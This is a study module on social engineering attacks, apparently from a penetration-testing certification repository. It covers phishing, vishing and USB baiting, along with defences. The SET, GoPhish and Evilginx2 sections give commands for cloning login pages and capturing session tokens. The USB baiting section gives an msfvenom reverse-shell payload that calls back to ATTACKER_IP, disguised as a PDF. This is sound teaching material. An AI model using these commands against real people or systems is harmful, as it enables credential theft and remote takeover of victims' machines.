# Module 04: Social Engineering Attacks

> **Curriculum alignment:** CEH v13 Domain 6 / CompTIA PenTest+ PT0-003 — Domain 3.0 Attacks & Exploits
> **Difficulty:** Intermediate
> **Estimated study time:** 4 hours

---

## Overview

Social engineering exploits human psychology rather than technical vulnerabilities — it is consistently one of the most effective initial access vectors in real-world breaches. This module covers phishing, vishing, pretexting, impersonation, and physical intrusion techniques, as well as the Social-Engineer Toolkit (SET). Defence focuses on security awareness training and technical controls.

---

## Table of Contents

- [Key Concepts](#key-concepts)
- [Methodology / Process](#methodology--process)
- [Tools & Commands](#tools--commands)
- [Attack Techniques (Offensive)](#attack-techniques-offensive)
- [Detection & Defence (Defensive)](#detection--defence-defensive)
- [CTF Tips & Tricks](#ctf-tips--tricks)
- [Common Mistakes](#common-mistakes)
- [Practice Labs](#practice-labs)
- [References](#references)

---

## Key Concepts

### Social Engineering Attack Vectors

| Vector | Description |
|--------|-------------|
| Phishing | Mass email campaign with malicious link or attachment |
| Spear Phishing | Targeted phishing tailored to a specific individual or organisation |
| Whaling | Spear phishing targeting C-level executives |
| Vishing | Voice phishing via telephone |
| Smishing | SMS-based phishing |
| Pretexting | Creating a fabricated scenario to extract information |
| Baiting | Leaving a malware-laden USB drive in a target location |
| Quid Pro Quo | Offering help in exchange for credentials (fake IT support) |
| Tailgating / Piggybacking | Physical intrusion by following an authorised person through a door |

### Psychological Principles Exploited

| Principle | Example |
|-----------|---------|
| Authority | "This is IT support, I need your password to fix your account." |
| Urgency | "Your account will be suspended in 24 hours if you do not act now." |
| Social Proof | "All employees have already updated their credentials via this link." |
| Scarcity | "Only 3 licences remain — claim yours now." |
| Liking / Trust | Building rapport before making a request |
| Fear | "We detected suspicious activity on your account." |

---

## Methodology / Process

1. **Target profiling** — LinkedIn, company website, OSINT to identify names, roles, email formats
2. **Pretext development** — build a convincing cover story appropriate to the target
3. **Lure creation** — craft phishing email, call script, or physical prop
4. **Delivery** — send phishing, make call, or execute physical intrusion
5. **Credential/data harvesting** — capture submitted credentials or extracted information
6. **Reporting** — document click rates, credential submissions, physical access gained

![Social Engineering Lifecycle](./images/social-engineering-lifecycle.png)
*Figure 1: Social engineering attack lifecycle from profiling to reporting*

---

## Tools & Commands

### Social-Engineer Toolkit (SET)

**Purpose:** Automate phishing, credential harvesting, and payload delivery
**Install:** Pre-installed on Kali Linux (`setoolkit`)

```bash
# Launch SET
sudo setoolkit

# Menu navigation (interactive):
# 1) Social-Engineering Attacks
#   > 2) Website Attack Vectors
#     > 3) Credential Harvester Attack Method
#       > 2) Site Cloner
#         Enter URL to clone: https://accounts.google.com
```

---

### GoPhish

**Purpose:** Open-source phishing simulation framework with web dashboard
**Install:** Download from GitHub releases

```bash
# Start GoPhish server
./gophish

# Access dashboard at https://localhost:3333
# Default credentials: admin / gophish

# Key workflow:
# 1. Create Sending Profile (SMTP relay)
# 2. Create Landing Page (clone target login)
# 3. Create Email Template (phishing lure)
# 4. Create Campaign (assign template + target group)
```

---

### Evilginx2

**Purpose:** Reverse proxy phishing framework — bypasses MFA by proxying real site and capturing session tokens
**Install:** `go install github.com/kgretzky/evilginx2@latest`

```bash
# Start evilginx2
sudo evilginx2

# Configure domain and IP
config domain yourdomain.com
config ipv4 YOUR_SERVER_IP

# List available phishlets
phishlets

# Enable a phishlet (example: Microsoft)
phishlets hostname microsoft yourdomain.com
phishlets enable microsoft

# Create a lure
lures create microsoft
lures get-url 0
```

---

## Attack Techniques (Offensive)

### Technique 1: Spear Phishing with Credential Harvesting

**Description:** Send a targeted email to a specific employee with a cloned login page. Capture submitted credentials.
**Prerequisites:** Target email address, email sending infrastructure, cloned landing page.
**MITRE ATT&CK:** [T1566.002 — Spear Phishing Link](https://attack.mitre.org/techniques/T1566/002/)

```bash
# Step 1: Identify target email format via OSINT
# Example: first.last@company.com found on LinkedIn

# Step 2: Clone target login page with SET
sudo setoolkit
# 1 > 2 > 3 > 2 > enter URL

# Step 3: Send phishing email with your server's IP as the link
# SET listens on port 80 for credential submissions
```

---

### Technique 2: USB Baiting

**Description:** Drop a USB drive with autorun malware in a target's parking lot or common area.
**Prerequisites:** Physical access to the target area, USB drive with payload.
**MITRE ATT&CK:** [T1091 — Replication Through Removable Media](https://attack.mitre.org/techniques/T1091/)

```bash
# Generate payload with msfvenom
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=ATTACKER_IP LPORT=4444 -f exe -o payload.exe

# Disguise payload as legitimate file
# Rename to: Invoice_Q4_2026.exe or HR_Policy_2026.pdf.exe

# Start listener
msfconsole -q -x "use exploit/multi/handler; set payload windows/x64/meterpreter/reverse_tcp; set LHOST ATTACKER_IP; set LPORT 4444; run"
```

---

## Detection & Defence (Defensive)

### Defending Against Phishing

**Detection indicators:**
- Email gateway alerts on spoofed sender domains (SPF/DKIM/DMARC failures)
- Proxy logs showing users visiting newly registered domains
- Credential submission to external sites not on the corporate allowlist

**Mitigations:**
- Implement DMARC, DKIM, and SPF on all outbound mail domains
- Deploy an email security gateway (Proofpoint, Mimecast) with URL rewriting
- Enable MFA on all accounts — credential theft alone is insufficient for access
- Run regular simulated phishing campaigns to measure and reduce click rates
- Conduct security awareness training — teach employees to report suspicious emails
- Block USB storage devices via endpoint policy (Group Policy / MDM)

**CIS Controls:** CIS Control 14 (Security Awareness and Skills Training), CIS Control 9 (Email and Web Browser Protections)

---

## CTF Tips & Tricks

- **OSINT first:** In CTFs with a social engineering component, check the target's social media profiles for leaked information (email, phone, department names).
- **Metadata:** Use `exiftool` on documents found during recon — author names, software versions, and internal paths are often embedded.
- **Phishing simulations:** In CTF scenarios, look for credentials in simulated phishing email capture logs.

---

## Common Mistakes

| Mistake | Why it matters | Correct approach |
|---------|---------------|-----------------|
| No pretext quality check | Poorly crafted pretexts alert the target | Peer review all phishing templates before sending |
| Sending from your real IP | Exposes attacker infrastructure | Use a dedicated VPS with no attribution to your identity |
| Not tracking metrics | Cannot measure campaign effectiveness | Always log delivery, open, click, and submission rates |
| Forgetting physical SE in scope | Physical intrusion can bypass all technical controls | Include tailgating and badge cloning in full-scope assessments |

---

## Practice Labs

| Platform | Lab / Room Name | Difficulty | Link |
|----------|----------------|------------|------|
| TryHackMe | Phishing | Easy | [Link](https://tryhackme.com/room/phishingyl) |
| TryHackMe | Phishing Analysis Fundamentals | Easy | [Link](https://tryhackme.com/room/phishingemails1tryoe) |
| TryHackMe | Social Engineering | Easy | [Link](https://tryhackme.com/room/socialengineering) |

---

## References

- [MITRE ATT&CK — Initial Access: Phishing](https://attack.mitre.org/techniques/T1566/) — Technique reference
- [GoPhish Documentation](https://docs.getgophish.com/) — Phishing simulation platform
- [Verizon DBIR](https://www.verizon.com/business/resources/reports/dbir/) — Annual breach report with social engineering statistics
- CEH v13 Official Courseware — Module 06
- CompTIA PenTest+ PT0-003 Study Guide — Chapter 5

---

*Back to [Repository Root](../)*
